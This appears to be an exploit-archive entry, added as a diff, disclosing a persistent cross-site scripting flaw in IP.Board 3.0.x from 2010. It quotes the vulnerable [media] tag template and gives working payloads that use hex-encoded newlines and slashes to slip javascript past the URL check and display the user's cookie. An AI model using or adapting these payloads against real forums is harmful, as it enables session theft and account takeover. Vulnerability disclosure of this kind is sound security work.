@@ -1,0 +1,49 @@
+id: 12232
+date: 05/14/2010
+title: IP.Board (IPB) 3.0.x Persistent XSS Vulnerability
+author: Cryptovirus
+cves: 
+
+=================================================
+IP.Board (IPB) 3.0.x Persistent XSS Vulnerability
+=================================================
+
+
+# Date: 05/14/2010
+# Author: Cryptovirus
+# Software Link: http://community.invisionpower.com/
+# Version: 3.0.x
+
+The Vulnerability and Exploit
+The vulnerability is caused by the following code, which is used to parse [media] tags:
+
+<mediatag_match>{1}.swf</mediatag_match>
+<mediatag_replace>
+<=!=[=C=D=A=T=A=[<object type="application/x-shockwave-flash" data="$1.swf" {width} {height}>
+    <param name="movie" value="$1.swf" />
+    <img src="{image_url}/noflash.png" alt="{text.no_flash_available}" />
+</object>]=]=>
+</mediatag_replace>
+
+As you can see, the tag matches anything with an swf extension and replaces it with the given embed code. At the time of discovery, only one other URL checking mechanism was in place - a URL with forward slashes beyond the http:// will result in an error message saying "Flash videos are not allowed". This is easily defeated using hex encoded characters.
+
+Therefore, a cleverly crafted URL will result in javascript being executed in a post.
+
+For example:
+
+[media]javascript://%0aalert(document.cookie);%2F%2F.swf[/media]
+
+The above code used in a post will give the user a nice alert dialog with their cookie inside.
+
+Nota Bene:
+The reason that the following vector won't work:
+
+[media]javascript:alert(document.cookie);%2F%2F.swf[/media]
+
+Is that the URL is also being checked for the presence of a :// as in http:// - Since this check is there, we need the %0a hex character to essentially put the rest of the javascript on a new line, since in JavaScript // comments out the rest of the line.
+
+This is also the reason we are using %2F%2F at the end of the URL, because it translates to // and comments out the .swf as far as JavaScript is concerned, and therefore the code executes without error. 
+
+
+
+#  0day.today [2023-03-26]  #
